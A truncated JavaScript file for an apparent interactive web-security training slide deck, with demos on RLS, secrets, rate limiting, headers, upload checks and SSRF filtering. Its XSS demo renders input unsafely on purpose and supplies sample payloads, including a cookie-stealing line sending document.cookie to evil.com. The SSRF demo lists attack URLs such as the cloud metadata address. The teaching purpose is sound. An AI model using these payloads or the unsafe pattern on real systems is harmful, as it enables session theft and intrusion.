      clearTimeout(hideTimeout);
    });
    
    toc.addEventListener('mouseleave', hideTOC);
  }
}

function updateTOCActive(currentIndex) {
  const tocItems = $$('.toc-item');
  tocItems.forEach((item, i) => {
    item.classList.toggle('active', i === currentIndex);
  });
}

// Slide content embedded to avoid CORS issues with file://
const SLIDE_CONTENT = {};

async function loadSlides() {
  const content = $('#content');
  if (!content) return;

  // Check if slides are already embedded in DOM or if we need to load them
  const existingSlides = $$('.slide');
  if (existingSlides.length > 0) {
    // Slides already loaded, just init demos
    if (typeof initAllDemos === 'function') {
      initAllDemos();
    }
    initProgress();
    return;
  }

  // If running from file://, try to load via script tags or fallback
  // For now, show error message with instructions
  content.innerHTML = `
    <section class="slide" id="error" data-color="red" tabindex="-1">
      <h2>⚠️ Loading Issue</h2>
      <p>The multi-file structure requires a web server to work properly.</p>
      <h3>Solutions:</h3>
      <ul>
        <li><strong>Option 1:</strong> Run <code>python3 -m http.server 8001</code> and visit <code>http://localhost:8001</code></li>
        <li><strong>Option 2:</strong> Use the original single-file version for direct file:// access</li>
        <li><strong>Option 3:</strong> Use VS Code Live Server extension</li>
      </ul>
      <p><em>The slides are in individual files for parallel development, but need a server to load.</em></p>
    </section>
  `;
  
  // Initialize progress with error slide
  initProgress();
}

function main() {
  // Load slides first, then initialize everything else
  loadSlides().then(() => {
    initKeyboardNav();
    initSnapWheel();
    initTOC();
    initViewportStabilization();
    
    // Auto-show timeline on interaction
    let uiTimer = null;
    const wakeUI = () => {
      document.body.setAttribute('data-ui-awake', 'true');
      clearTimeout(uiTimer);
      uiTimer = setTimeout(() => document.body.setAttribute('data-ui-awake', 'false'), 1500);
    };
    ['mousemove','keydown','touchstart','wheel'].forEach(ev => window.addEventListener(ev, wakeUI, { passive: true }));
    window.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        /* nothing to close now */
      }
    });
  });
}

function initViewportStabilization() {
  const scroller = getScroller();
  if (!scroller) return;
  
  // Disable browser scroll restoration
  if ('scrollRestoration' in history) {
    history.scrollRestoration = 'manual';
  }
  
  let currentSlideIndex = 0;
  let isResizing = false;
  let resizeTimeout = null;
  
  // Track current slide index based on scroll position
  const updateCurrentSlide = () => {
    if (isResizing) return; // Don't update during resize
    
    const sections = getSections();
    const scrolled = scroller.scrollTop + 1; // Small offset for edge cases
    
    for (let i = 0; i < sections.length; i++) {
      const section = sections[i];
      const sectionTop = section.offsetTop;
      const sectionBottom = sectionTop + section.offsetHeight;
      
      if (scrolled >= sectionTop && scrolled < sectionBottom) {
        currentSlideIndex = i;
        break;
      }
    }
  };
  
  // Handle resize start - disable snap immediately
  const handleResizeStart = () => {
    if (isResizing) return;
    
    isResizing = true;
    scroller.classList.add('no-snap');
    
    // Clear any existing timeout
    clearTimeout(resizeTimeout);
  };
  
  // Handle resize end - restore position and re-enable snap
  const handleResizeEnd = () => {
    clearTimeout(resizeTimeout);
    resizeTimeout = setTimeout(() => {
      const sections = getSections();
      const targetSection = sections[currentSlideIndex];
      
      if (targetSection) {
        // Scroll to the correct slide without animation
        scroller.scrollTo({
          top: targetSection.offsetTop,
          behavior: 'auto'
        });
        
        // Re-enable snap after a brief delay
        setTimeout(() => {
          scroller.classList.remove('no-snap');
          isResizing = false;
        }, 50);
      } else {
        scroller.classList.remove('no-snap');
        isResizing = false;
      }
      
      // Update content overflow after stabilization
      setTimeout(() => {
        checkContentOverflow();
      }, 100);
    }, 150); // Debounce resize events
  };
  
  // Listen for scroll to track current slide
  scroller.addEventListener('scroll', updateCurrentSlide, { passive: true });
  
  // Listen for resize events
  window.addEventListener('resize', () => {
    handleResizeStart();
    handleResizeEnd();
  }, { passive: true });
  
  // Initialize current slide
  updateCurrentSlide();
}

// Ensure initialization even if DOMContentLoaded already fired
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', main);
} else {
  main();
}
// Slide demo functions

// Frontend vs Backend Demo
function initFrontendBackendDemo() {
  const checkoutBtn = document.getElementById('checkoutBtn');
  if (!checkoutBtn) return;

  let attempts = 0;
  
  checkoutBtn.addEventListener('click', () => {
    attempts++;
    const status = document.querySelector('#frontendBackendDemo .demo-status');
    
    if (checkoutBtn.disabled) {
      // This shouldn't happen normally, but DevTools can bypass
      status.innerHTML = `<span class="warning">⚠️ Button was disabled, but click went through! (Attempt ${attempts})</span>`;
    } else {
      status.innerHTML = `<span class="success">✅ Server validated: Payment processed! But in real life, server should check permissions regardless of UI state. (Attempt ${attempts})</span>`;
    }
    
    // Show the security lesson
    setTimeout(() => {
      status.innerHTML += `<br><strong>Security lesson:</strong> Always validate on the server, never trust the client!`;
    }, 1000);
  });

  // Show instructions
  const instructions = document.createElement('div');
  instructions.className = 'demo-instructions';
  instructions.innerHTML = `
    <p><strong>Try this:</strong></p>
    <ol>
      <li>Right-click the button → Inspect Element</li>
      <li>Remove the <code>disabled</code> attribute</li>
      <li>Click the button</li>
    </ol>
  `;
  checkoutBtn.parentNode.appendChild(instructions);
}

// Secrets Scanner Demo
function initSecretsDemo() {
  const secretInfo = document.querySelector('#secretsDemo .secret-info');
  if (!secretInfo) return;

  const secretData = {
    'supabase-public': {
      title: 'Supabase Anon Key',
      location: '✅ SAFE with VITE_',
      explanation: 'Public by design. Use VITE_ prefix so it gets bundled to frontend. Protected by RLS policies.',
      example: 'VITE_SUPABASE_ANON_KEY=eyJh...VCJ9',
      color: 'success'
    },
    'supabase-service': {
      title: 'Supabase Service Role Key',
      location: '🚨 NO VITE_ PREFIX',
      explanation: 'Bypasses all RLS! Keep in server .env file only (no VITE_ prefix).',
      example: 'SUPABASE_SERVICE_ROLE_KEY=eyJh...VCJ9',
      color: 'error'
    },
    'stripe-public': {
      title: 'Stripe Public Key',
      location: '✅ SAFE with VITE_',
      explanation: 'Starts with pk_. Can only create payment intents, not charge. Use VITE_ prefix.',
      example: 'VITE_STRIPE_PUBLIC_KEY=pk_test_51H...',
      color: 'success'
    },
    'stripe-secret': {
      title: 'Stripe Secret Key',
      location: '🚨 NO VITE_ PREFIX',
      explanation: 'Starts with sk_. Can charge cards! Keep server-only (no VITE_ prefix).',
      example: 'STRIPE_SECRET_KEY=sk_test_51H...',
      color: 'error'
    },
    'google-maps': {
      title: 'Google Maps API Key',
      location: '⚠️ VITE_ + domain restrictions',
      explanation: 'Can use VITE_ prefix BUT must restrict to your domain in Google Console.',
      example: 'VITE_GOOGLE_MAPS_KEY=AIza...WK',
      color: 'warning'
    },
    'jwt-secret': {
      title: 'JWT Signing Secret',
      location: '🚨 NO VITE_ PREFIX',
      explanation: 'Signs auth tokens. If leaked, anyone can fake users! Server .env only.',
      example: 'JWT_SECRET=your-256-bit...',
      color: 'error'
    }
  };

  window.showSecretInfo = function(secretType) {
    const data = secretData[secretType];
    if (!data) return;

    // Clear previous selections
    document.querySelectorAll('.secret-card').forEach(card => {
      card.classList.remove('selected');
    });
    
    // Mark current selection
    document.querySelector(`[data-secret="${secretType}"]`).classList.add('selected');

    secretInfo.innerHTML = `
      <div class="secret-details ${data.color}">
        <h4>${data.title}</h4>
        <div class="location">${data.location}</div>
        <p>${data.explanation}</p>
        <div class="example">
          <strong>Example:</strong>
          <code>${data.example}</code>
        </div>
      </div>
    `;
  };
}

// RLS Demo
function initRLSDemo() {
  let databaseRecords = []; // All records in the "database"
  let recordIdCounter = 1;
  
  const dataInput = document.querySelector('#rlsDemo #dataInput');
  const dataOwner = document.querySelector('#rlsDemo #dataOwner');
  const tableBody = document.querySelector('#rlsDemo #tableBody');
  const currentUser = document.querySelector('#rlsDemo #currentUser');
  const rlsEnabled = document.querySelector('#rlsDemo #rlsEnabled');
  const resultsBody = document.querySelector('#rlsDemo #resultsBody');
  const sqlDisplay = document.querySelector('#rlsDemo #sqlDisplay');
  const securityWarning = document.querySelector('#rlsDemo #securityWarning');
  const resultsTitle = document.querySelector('#rlsDemo #resultsTitle');
  
  if (!dataInput || !tableBody) return;

  function formatTime(date) {
    return date.toLocaleTimeString('en-US', { 
      hour12: false, 
      hour: '2-digit', 
      minute: '2-digit',
      second: '2-digit'
    });
  }

  function updateDatabaseTable() {
    tableBody.innerHTML = databaseRecords.map(record => 
      `<tr>
        <td>${record.id}</td>
        <td>${record.owner}</td>
        <td>${record.data}</td>
        <td>${formatTime(record.created)}</td>
      </tr>`
    ).join('');
  }

  function updateQueryResults() {
    const user = currentUser.value;
    const rlsOn = rlsEnabled.checked;
    
    let visibleRecords;
    let sqlQuery;
    
    if (rlsOn) {
      // RLS filters automatically
      visibleRecords = databaseRecords.filter(record => record.owner === user);
      sqlQuery = `SELECT * FROM notes WHERE owner = '${user}'; -- RLS automatically adds this filter`;
    } else {
      // No RLS - all records visible (security vulnerability!)
      visibleRecords = databaseRecords;
      sqlQuery = `SELECT * FROM notes; -- ⚠️ NO FILTERING - ALL DATA EXPOSED!`;
    }
    
    // Update SQL display
    sqlDisplay.innerHTML = `<code>${sqlQuery}</code>`;
    
    // Update results table
    resultsBody.innerHTML = visibleRecords.map((record, index) => {
      const isOwnRecord = record.owner === user;
      const rowClass = rlsOn ? (isOwnRecord ? 'accessible' : 'blocked') : (isOwnRecord ? 'own-record' : 'exposed-record');
      
      return `<tr class="${rowClass}">
        <td>${record.id}</td>
        <td>${record.owner}</td>
        <td>${record.data}</td>
        <td>${formatTime(record.created)}</td>
      </tr>`;
    }).join('');
    
    // Update title and warnings
    if (rlsOn) {
      resultsTitle.textContent = `Query Results (${visibleRecords.length} rows) - RLS Protected`;
      securityWarning.style.display = 'none';
    } else {
      resultsTitle.textContent = `Query Results (${visibleRecords.length} rows) - NO RLS PROTECTION`;
      const exposedRecords = visibleRecords.filter(record => record.owner !== user);
      if (exposedRecords.length > 0) {
        securityWarning.style.display = 'block';
        securityWarning.innerHTML = `
          <strong>🚨 SECURITY VULNERABILITY!</strong><br>
          User "${user}" can see ${exposedRecords.length} record(s) belonging to other users!<br>
          This is why RLS is essential for data protection.
        `;
      } else {
        securityWarning.style.display = 'none';
      }
    }
  }

  window.addDatabaseRecord = function() {
    if (!dataInput || !dataOwner) return;
    const data = dataInput.value.trim();
    if (!data) return;
    
    const record = {
      id: recordIdCounter++,
      owner: dataOwner.value,
      data: data,
      created: new Date()
    };
    
    databaseRecords.push(record);
    dataInput.value = '';
    
    updateDatabaseTable();
    // Don't auto-update query results - user must click query button
  };

  window.runQuery = function() {
    updateQueryResults();
  };

  window.resetDatabase = function() {
    databaseRecords = [];
    recordIdCounter = 1;
    updateDatabaseTable();
    
    // Reset query results to initial state
    resultsTitle.textContent = 'Query Results';
    sqlDisplay.innerHTML = '<code>Click "SELECT * FROM notes" to run query</code>';
    resultsBody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--text-muted); font-style: italic;">No query executed yet</td></tr>';
    securityWarning.style.display = 'none';
  };

  // Add Enter key support
  if (dataInput) {
    dataInput.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') {
        addDatabaseRecord();
      }
    });
  }

  // Remove real-time updates - only update when query button is clicked

  // Initialize with some sample data
  databaseRecords = [
    { id: 1, owner: 'User A', data: 'My secret project notes', created: new Date(Date.now() - 120000) },
    { id: 2, owner: 'User B', data: 'Personal diary entry', created: new Date(Date.now() - 60000) }
  ];
  recordIdCounter = 3;
  
  updateDatabaseTable();
  
  // Initialize query results area with prompt to run query
  resultsTitle.textContent = 'Query Results';
  sqlDisplay.innerHTML = '<code>Click "SELECT * FROM notes" to run query</code>';
  resultsBody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--text-muted); font-style: italic;">No query executed yet</td></tr>';
  securityWarning.style.display = 'none';
}

// XSS Demo (Enhanced from existing)
function initXSSDemo() {
  const input = document.getElementById('xssInput');
  const output = document.getElementById('xssOut');
  const btnInsecure = document.getElementById('btnInsecure');
  const btnSecure = document.getElementById('btnSecure');
  const btnClear = document.getElementById('btnClear');
  
  if (!input || !output) return;

  btnInsecure?.addEventListener('click', () => {
    // Intentionally unsafe for demo
    const userInput = input.value;
    output.innerHTML = userInput;
    output.className = 'xss-output insecure';
    
    // Simulate XSS execution for demo purposes
    // Check if input contains XSS patterns and simulate their execution
    if (userInput.includes('<script>') || userInput.includes('onerror=') || userInput.includes('onload=') || userInput.includes('document.cookie') || userInput.includes('fetch(')) {
      // Add visual indicator that XSS would have executed
      setTimeout(() => {
        // Show XSS execution warning
        const xssWarning = document.createElement('div');
        xssWarning.className = 'xss-executed';
        
        // Check if it's a cookie theft attack for specific warning
        let warningMessage = '🚨 XSS EXECUTED! In a real app, malicious code would run here! 🚨';
        if (userInput.includes('document.cookie') || userInput.includes('fetch(')) {
          warningMessage = '🍪 COOKIE THEFT ATTACK! Session cookies would be stolen and sent to evil.com! 🚨';
        }
        
        xssWarning.innerHTML = warningMessage;
        xssWarning.style.cssText = `
          background: red; 
          color: white; 
          padding: 10px; 
          border: 2px solid darkred; 
          border-radius: 5px; 
          margin: 10px 0; 
          animation: pulse 1s infinite;
          font-weight: bold;
        `;
        output.appendChild(xssWarning);
        
        // Simulate page background flash
        document.body.style.backgroundColor = '#ff000033';
        setTimeout(() => {
          document.body.style.backgroundColor = '';
        }, 1000);
        
        // Show alert after visual effects
        setTimeout(() => {
          alert('🚨 XSS Attack Simulated! In a real application, malicious JavaScript would have executed.');
        }, 500);
        
      }, 100);
    }
  });

  btnSecure?.addEventListener('click', () => {
    // Safe text content
    output.textContent = input.value;
    output.className = 'xss-output secure';
  });

  btnClear?.addEventListener('click', () => {
    input.value = '';
    output.textContent = '';
    output.className = '';
  });

  // Add sample XSS payloads
  const samplesDiv = document.createElement('div');
  samplesDiv.className = 'xss-samples';
  samplesDiv.innerHTML = `
    <details>
      <summary>Sample XSS Payloads (for testing)</summary>
      <div class="sample-buttons">
        <button type="button" data-payload="image">Image XSS</button>
        <button type="button" data-payload="script">Script Tag</button>
        <button type="button" data-payload="svg">SVG XSS</button>
        <button type="button" data-payload="cookie">Cookie Theft</button>
      </div>
    </details>
  `;
  
  // Add event listeners for sample buttons
  const sampleButtons = samplesDiv.querySelectorAll('button[data-payload]');
  sampleButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      const payload = btn.dataset.payload;
      switch(payload) {
        case 'image':
          input.value = '<img src=x onerror="this.style.backgroundColor=\'red\'; this.style.width=\'200px\'; this.style.height=\'50px\'; this.innerHTML=\'🚨 XSS EXECUTED! 🚨\';">';
          break;
        case 'script':
          input.value = '<script>document.body.style.backgroundColor="red"; setTimeout(() => document.body.style.backgroundColor="", 2000);<\/script>';
          break;
        case 'svg':
          input.value = '<svg onload="this.innerHTML=\'<text x=10 y=20 fill=red>🚨 XSS EXECUTED! 🚨</text>\'; this.style.backgroundColor=\'yellow\';" width="200" height="30">';
          break;
        case 'cookie':
          input.value = '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\' + document.cookie)">';
          break;
      }
    });
  });
  
  input.parentNode.appendChild(samplesDiv);
}

// Rate Limiting Demo
function initRateLimitDemo() {
  const log = document.querySelector('#rateLimitDemo .request-log');
  if (!log) return;

  let requestCount = 0;
  let isLimited = false;
  const RATE_LIMIT = 5;
  const WINDOW_MS = 10000; // 10 seconds

  window.makeRequest = function() {
    requestCount++;
    
    if (requestCount > RATE_LIMIT && !isLimited) {
      isLimited = true;
      setTimeout(() => {
        isLimited = false;
        requestCount = 0;
      }, WINDOW_MS);
    }

    const timestamp = new Date().toLocaleTimeString();
    const status = isLimited ? '429 Too Many Requests' : '200 OK';
    const statusClass = isLimited ? 'error' : 'success';
    
    const logEntry = `
      <div class="log-entry ${statusClass}">
        [${timestamp}] Request ${requestCount}: ${status}
      </div>
    `;
    
    log.innerHTML = logEntry + log.innerHTML;
    
    // Limit log entries
    const entries = log.children;
    if (entries.length > 10) {
      entries[entries.length - 1].remove();
    }
  };

  window.floodRequests = function() {
    for (let i = 0; i < 10; i++) {
      setTimeout(() => makeRequest(), i * 100);
    }
  };

  window.resetLimits = function() {
    requestCount = 0;
    isLimited = false;
    log.innerHTML = '<p class="info">Rate limits reset!</p>';
  };
}

// Headers Demo
function initHeadersDemo() {
  // Add toggle functionality for header cards
  window.toggleHeaderDetail = function(card) {
    const detail = card.querySelector('.header-detail');
    const isVisible = detail.style.display !== 'none';
    
    // Close all other details
    document.querySelectorAll('.header-card .header-detail').forEach(d => {
      d.style.display = 'none';
    });
    document.querySelectorAll('.header-card').forEach(c => {
      c.classList.remove('expanded');
    });
    
    // Toggle current one
    if (!isVisible) {
      detail.style.display = 'block';
      card.classList.add('expanded');
    }
  };

  // Modal functions
  window.openHeadersModal = function() {
    const modal = document.getElementById('headersModal');
    const analysisDiv = document.getElementById('headersAnalysis');
    
    if (!modal || !analysisDiv) return;
    
    // Generate detailed analysis
    const isFileProtocol = window.location.protocol === 'file:';
    const currentOrigin = window.location.origin;
    
    const headers = [
      {
        name: 'CSP',
        present: false,
        description: 'Content Security Policy prevents XSS attacks by controlling which scripts can run.',
        impact: 'Without CSP, malicious scripts can execute on your page, stealing user data or performing actions on their behalf.',
        icon: '✖️'
      },
      {
        name: 'HSTS',
        present: !isFileProtocol,
        description: 'HTTP Strict Transport Security forces browsers to use HTTPS connections.',
        impact: isFileProtocol ? 'Not applicable for file:// protocol.' : 'Without HSTS, attackers can downgrade connections to HTTP and intercept traffic.',
        icon: !isFileProtocol ? '✅' : '➖'
      },
      {
        name: 'X-Frame-Options',
        present: false,
        description: 'Prevents your site from being embedded in malicious iframes.',
        impact: 'Without this header, attackers can embed your site invisibly to trick users into clicking (clickjacking).',
        icon: '✖️'
      },
      {
        name: 'CORS',
        present: true,
        description: 'Cross-Origin Resource Sharing controls which domains can access your API.',
        impact: 'Currently configured to allow requests from this origin only.',
        icon: '✅'
      }
    ];
    
    const missing = headers.filter(h => !h.present).length;
    const summaryClass = missing === 0 ? 'good' : 'warning';
    const summaryText = missing === 0 
      ? '✅ All essential headers are configured!' 
      : `⚠️ ${missing} essential header${missing > 1 ? 's' : ''} missing`;
    
    analysisDiv.innerHTML = `
      <div class="headers-analysis">
        <div class="analysis-summary ${summaryClass}">
          ${summaryText}
        </div>
        
        <div class="headers-detail">
          ${headers.map(h => `
            <div class="header-analysis-item ${h.present ? 'present' : 'missing'}">
              <h4>${h.icon} ${h.name}</h4>
              <p><strong>What it does:</strong> ${h.description}</p>
              <p><strong>Security impact:</strong> ${h.impact}</p>
            </div>
          `).join('')}
        </div>
        
        <div class="origin-info-modal">
          <strong>Current Origin:</strong> <code>${currentOrigin}</code><br>
          <small>Origin = protocol + domain + port. This determines CORS and security header scope.</small>
        </div>
      </div>
    `;
    
    modal.style.display = 'flex';
    
    // Focus management for accessibility
    const closeButton = modal.querySelector('.modal-close');
    if (closeButton) closeButton.focus();
    
    // Prevent body scroll
    document.body.style.overflow = 'hidden';
  };

  window.closeHeadersModal = function() {
    const modal = document.getElementById('headersModal');
    if (!modal) return;
    
    modal.style.display = 'none';
    document.body.style.overflow = '';
  };

  // Close modal on Escape key
  document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
      closeHeadersModal();
    }
  });
}

// File Upload Demo
function initUploadDemo() {
  const fileInput = document.getElementById('fileInput');
  const uploadStatus = document.querySelector('#uploadDemo .upload-status');
  const validationResults = document.querySelector('#uploadDemo .validation-results');
  
  if (!fileInput || !uploadStatus || !validationResults) return;

  const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/gif', 'text/plain', 'application/pdf'];
  const MAX_SIZE = 5 * 1024 * 1024; // 5MB

  // Magic byte signatures for common file types
  const magicBytes = {
    'image/jpeg': [0xFF, 0xD8, 0xFF],
    'image/png': [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A],
    'image/gif': [0x47, 0x49, 0x46, 0x38],
    'application/pdf': [0x25, 0x50, 0x44, 0x46],
    'exe': [0x4D, 0x5A], // MZ header for executables
  };

  function checkMagicBytes(file) {
    return new Promise((resolve) => {
      const reader = new FileReader();
      reader.onload = (e) => {
        const bytes = new Uint8Array(e.target.result.slice(0, 16));
        
        // Check for executable signature
        if (bytes[0] === 0x4D && bytes[1] === 0x5A) {
          resolve({ isExecutable: true, detectedType: 'executable' });
          return;
        }
        
        // Check against known good signatures
        for (const [type, signature] of Object.entries(magicBytes)) {
          if (type === 'exe') continue; // Skip exe check in good types
          const matches = signature.every((byte, i) => bytes[i] === byte);
          if (matches) {
            resolve({ isExecutable: false, detectedType: type });
            return;
          }
        }
        
        resolve({ isExecutable: false, detectedType: 'unknown' });
      };
      reader.readAsArrayBuffer(file);
    });
  }

  fileInput.addEventListener('change', async (e) => {
    const file = e.target.files[0];
    if (!file) return;

    uploadStatus.innerHTML = `<p>Validating file: <strong>${file.name}</strong></p>`;
    
    const validations = [];
    
    // Magic byte validation (file content check)
    const magicCheck = await checkMagicBytes(file);
    const ext = file.name.split('.').pop().toLowerCase();
    
    if (magicCheck.isExecutable) {
      validations.push({ 
        check: 'Magic bytes', 
        status: 'fail', 
        message: `🚨 Executable file detected! (.${ext} → executable)` 
      });
    } else if (magicCheck.detectedType !== 'unknown') {
      validations.push({ 
        check: 'Magic bytes', 
        status: 'pass', 
        message: `Content matches ${magicCheck.detectedType}` 
      });
    } else {
      validations.push({ 
        check: 'Magic bytes', 
        status: 'warning', 
        message: `Unknown file signature` 
      });
    }
    
    // Type validation (browser MIME)
    if (ALLOWED_TYPES.includes(file.type)) {
      validations.push({ check: 'MIME type', status: 'pass', message: `${file.type} is allowed` });
    } else {
      validations.push({ check: 'MIME type', status: 'fail', message: `${file.type} is not allowed` });
    }
    
    // Size validation
    if (file.size <= MAX_SIZE) {
      validations.push({ check: 'File size', status: 'pass', message: `${(file.size / 1024 / 1024).toFixed(2)} MB is within limit` });
    } else {
      validations.push({ check: 'File size', status: 'fail', message: `${(file.size / 1024 / 1024).toFixed(2)} MB exceeds 5MB limit` });
    }
    
    // Extension check
    const suspiciousExts = ['exe', 'bat', 'cmd', 'com', 'pif', 'scr', 'vbs', 'js', 'jar'];
    if (suspiciousExts.includes(ext)) {
      validations.push({ check: 'File extension', status: 'fail', message: `${ext} files are blocked for security` });
    } else {
      validations.push({ check: 'File extension', status: 'pass', message: `${ext} extension is safe` });
    }

    const allPassed = validations.every(v => v.status === 'pass');
    const hasFail = validations.some(v => v.status === 'fail');
    
    validationResults.innerHTML = `
      <div class="validation-summary ${allPassed ? 'success' : hasFail ? 'error' : 'warning'}">
        ${allPassed ? '✅ File would be accepted' : hasFail ? '❌ File would be rejected' : '⚠️ File flagged for review'}
      </div>
      <div class="validation-details">
        ${validations.map(v => `
          <div class="validation-item ${v.status}">
            <strong>${v.check}:</strong> ${v.message}
          </div>
        `).join('')}
      </div>
    `;
  });
}

// SSRF Protection Demo
function initSSRFDemo() {
  // Helpers inside the demo scope (simulation only)
  const ALLOWED_PROTOCOLS = ['http:', 'https:'];
  const OUTBOUND_ALLOWLIST = ['example.com', 'api.myapp.com']; // demo allowlist

  function isLocalhostName(host) {
    const h = host.toLowerCase();
    return h === 'localhost' || h.endsWith('.localhost') || h === 'localdomain' || h.endsWith('.localdomain') || h === 'home.arpa' || h.endsWith('.home.arpa');
  }

  function isIPv4(host) {
    return /^\d+\.\d+\.\d+\.\d+$/.test(host);
  }

  function isPrivateIPv4(ip) {
    try {
      const parts = ip.split('.').map(n => parseInt(n, 10));
      if (parts.length !== 4 || parts.some(n => Number.isNaN(n))) return false;
      const [a, b] = parts;
      if (a === 10) return true;
      if (a === 127) return true; // loopback
      if (a === 0) return true; // this network
      if (a === 169 && b === 254) return true; // link-local
      if (a === 192 && b === 168) return true;
      if (a === 172 && b >= 16 && b <= 31) return true;
      return false;
    } catch { return false; }
  }

  function isIPv6(host) {
    return host.includes(':');
  }

  function isPrivateIPv6(host) {
    const h = host.toLowerCase();
    return h === '::1' || h.startsWith('fc') || h.startsWith('fd') || h.startsWith('fe80'); // loopback, ULA, link-local
  }

  function hasObfuscatedHost(host) {
    // Numeric-only or hex-only hostnames often encode IPs (e.g., 2130706433, 0x7f000001)
    if (/^(0x[0-9a-f]+|[0-9]+)$/i.test(host)) return true;
    // Hex dotted (0x7f.0x00.0x00.0x01) or octal dotted (0177.0.0.1)
    if (/^(0x[0-9a-f]+\.){3}0x[0-9a-f]+$/i.test(host)) return true;
    if (/^(0[0-7]+\.){3}0[0-7]+$/.test(host)) return true;
    return false;
  }

  function isAllowedByAllowlist(host) {
    const h = host.toLowerCase();
    return OUTBOUND_ALLOWLIST.some(allowed => h === allowed || h.endsWith('.' + allowed));
  }

  function defaultPort(protocol) {
    return protocol === 'https:' ? '443' : '80';
  }

  function isAllowedPort(protocol, port) {
    const p = port || defaultPort(protocol);
    return (protocol === 'https:' && p === '443') || (protocol === 'http:' && p === '80');
  }

  function simulateRedirectToPrivate(urlString) {
    // Purely educational: flag obvious redirect parameters/paths to private targets
    const patterns = [
      /redirect[^#?]*to[^#?]*localhost/i,
      /redirect[^#?]*to[^#?]*127\.0\.0\.1/i,
      /redirect[^#?]*to[^#?]*169\.254\.169\.254/i,
      /(?:[?&](?:to|target|url)=)(?:https?:\/\/)?(?:localhost|127\.0\.0\.1|169\.254\.169\.254|\[::1\])/i
    ];
    return patterns.some(rx => rx.test(urlString));
  }

  window.testSSRF = function(button) {
    const input = button.previousElementSibling;
    const results = document.querySelector('#ssrfDemo .ssrf-results');
    const urlString = input.value.trim();

    if (!urlString) {
      results.innerHTML = '<p class="warning">Please enter a URL to test!</p>';
      return;
    }

    let url;
    try {
      url = new URL(urlString);
    } catch (e) {
      results.innerHTML = '<div class="ssrf-result error">Invalid URL. Example: <code>https://example.com/api</code></div>';
      return;
    }

    const steps = [];
    let blocked = false;

    // 1) Protocol check
    const protocolOk = ALLOWED_PROTOCOLS.includes(url.protocol);
    steps.push({ status: protocolOk ? 'success' : 'error', label: 'Protocol', message: protocolOk ? `Allowed (${url.protocol.replace(':','')})` : `Blocked (${url.protocol})` });
    if (!protocolOk) blocked = true;

    // 2) Parse basics
    const hostname = url.hostname;
    const port = url.port || defaultPort(url.protocol);
    steps.push({ status: 'info', label: 'Parsed', message: `Host: <code>${hostname}</code> • Port: <code>${port}</code>` });

    // 3) Userinfo presence (phishing/userinfo trick)
    const hasUserInfo = Boolean(url.username || url.password);
    if (hasUserInfo) {
      steps.push({ status: 'warning', label: 'Userinfo', message: `Found <code>${url.username ? url.username : ''}${url.password ? ':***' : ''}@</code> — reject URLs with credentials` });
    } else {
      steps.push({ status: 'success', label: 'Userinfo', message: 'No credentials in URL' });
    }

    // 4) Allowlist
    const onAllowlist = isAllowedByAllowlist(hostname);
    steps.push({ status: onAllowlist ? 'success' : 'error', label: 'Allowlist', message: onAllowlist ? 'Host is on outbound allowlist' : 'Host is NOT on outbound allowlist' });
    if (!onAllowlist) blocked = true;

    // 5) Private network checks
    let privateHit = false;
    if (isLocalhostName(hostname)) {
      privateHit = true;
    } else if (isIPv4(hostname) && isPrivateIPv4(hostname)) {
      privateHit = true;
    } else if (isIPv6(hostname) && isPrivateIPv6(hostname)) {
      privateHit = true;
    }
    steps.push({ status: privateHit ? 'error' : 'success', label: 'Private IPs', message: privateHit ? 'Targets localhost/private/metadata range' : 'No private IP patterns detected' });
    if (privateHit) blocked = true;

    // 6) Obfuscation checks
    const obfuscated = hasObfuscatedHost(hostname);
    steps.push({ status: obfuscated ? 'warning' : 'success', label: 'Obfuscation', message: obfuscated ? 'Suspicious numeric/hex hostname' : 'No obvious obfuscation' });

    // 7) Port policy
    const portOk = isAllowedPort(url.protocol, url.port);
    steps.push({ status: portOk ? 'success' : 'error', label: 'Port', message: portOk ? `Allowed port (${port})` : `Blocked non-standard port (${port})` });
    if (!portOk) blocked = true;

    // 8) Redirect safety (simulated)
    const redirectTrap = simulateRedirectToPrivate(urlString);
    steps.push({ status: redirectTrap ? 'error' : 'success', label: 'Redirects', message: redirectTrap ? 'Simulated: would redirect to private IP' : 'No private redirect patterns detected' });
    if (redirectTrap) blocked = true;

    // Final decision
    const decision = blocked ? 'error' : 'success';
    const decisionText = blocked ? '❌ Request would be BLOCKED' : '✅ Request would be ALLOWED';

    results.innerHTML = `
      <div class="ssrf-result ${decision}">${decisionText}</div>
      <div class="ssrf-steps">
        ${steps.map(s => `<div class="rls-result ${s.status}"><strong>${s.label}:</strong> <span>${s.message}</span></div>`).join('')}
      </div>
      <div class="security-note">Key: Allowlist exact hosts, permit only http/https on standard ports, block private IPs (IPv4/IPv6), and reject redirects to private ranges.</div>
    `;
  };

  // Add sample URLs (safe and unsafe)
  const container = document.querySelector('#ssrfDemo');
  if (!container) return; // Safety check
  const samples = document.createElement('div');
  samples.className = 'ssrf-samples';
  samples.innerHTML = `
    <p><strong>Try these:</strong></p>
    <div class="sample-buttons">
      <button onclick="document.querySelector('#ssrfDemo input').value = 'http://169.254.169.254/latest/meta-data/'">AWS Metadata</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'http://localhost:3000/admin'">Localhost</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'http://127.0.0.1'">127.0.0.1</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'http://[::1]/'">IPv6 ::1</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'http://2130706433/'">Decimal 2130706433</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'http://0x7f000001/'">Hex 0x7f000001</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'http://localhost@evil.com/'">Userinfo Trick</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'gopher://example.com'">gopher://</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'http://example.com:8080'">Port 8080</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'https://example.com/redirect-to-localhost'">Redirect Trap (simulated)</button>
